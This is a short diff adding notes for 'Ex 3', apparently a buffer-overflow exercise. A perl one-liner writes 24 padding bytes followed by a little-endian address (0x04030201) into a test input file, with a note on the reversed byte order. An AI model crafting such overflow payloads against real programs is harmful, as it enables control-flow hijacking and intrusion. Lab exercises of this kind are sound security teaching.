@@ -1,0 +1,4 @@
+Ex 3:
+
+NOTE - order is reversed, so this will produce 0x04030201 as target address.
+perl -e "print 'A'x24, chr(0x01), chr(0x02), chr(0x03), chr(0x04)" >> test
